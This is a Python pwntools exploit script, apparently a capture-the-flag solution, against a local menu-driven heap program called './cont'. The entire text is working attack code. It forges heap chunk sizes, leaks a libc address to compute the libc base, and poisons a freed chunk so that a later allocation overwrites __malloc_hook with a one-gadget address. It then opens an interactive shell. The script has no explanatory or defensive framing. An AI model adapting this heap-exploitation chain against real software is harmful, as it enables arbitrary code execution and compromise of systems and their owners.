from pwn import *
def setname(c):
	p.readuntil("name: ")
	p.send(c)
def cmd(c):
	p.readuntil(">> ")
	p.sendline(str(c))
def add(idx,size,c="1"):
	cmd(1)
	p.readuntil("Index: ")
	p.sendline(str(idx))
	p.readuntil("th: ")
	p.sendline(str(size))
	p.readuntil("age: ")
	p.sendline(c)
def magic(idx,size,c="1"):
	cmd(1)
	p.readuntil("Index: ")
	p.sendline(str(idx))
	p.readuntil("th: ")
	p.sendline(str(size))
	p.readuntil("though")
	p.sendline(c)
def show(idx):
	cmd(3)
	p.readuntil("dex: ")
	p.sendline(str(idx))
def free(idx):
	cmd(4)
	p.readuntil("dex: ")
	p.sendline(str(idx))
p=process("./cont")
setname("A"+'\n')
p.readuntil("n) ")
p.sendline("y")
p.readuntil("d: ")
p.send("A"*0x18+p64(0x31))
add(0,0x20)
add(1,0x20)
add(2,0x20)
add(3,0x20)
magic(4,0x100,p64(0)*5+p64(0x11))
free(0)
free(1)
free(2)
free(3)
add(0,0x18)
show(0)
p.readuntil("age: ")
base=u64(p.read(6).ljust(8,'\x00'))-(0x00007ffff7dd0a31-0x00007ffff7a0d000)
log.warning(hex(base))

context.log_level='debug'
add(2,0x20)
add(1,0x20)
free(1)
free(2)
magic(1,0x200,p64(0)*5+p64(0x31)+p64(0x000000000602A60-0x10))
add(2,0x20)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address=base
magic(3,0x200,p64(0x0020002000200020)*2+p64(0x000000000602A60)*3+p64(libc.symbols['__malloc_hook']))


cmd(2)
one=base+0xf02a4
p.readuntil("message: ")
p.sendline(p64(one))
#gdb.attach(p)
p.interactive()

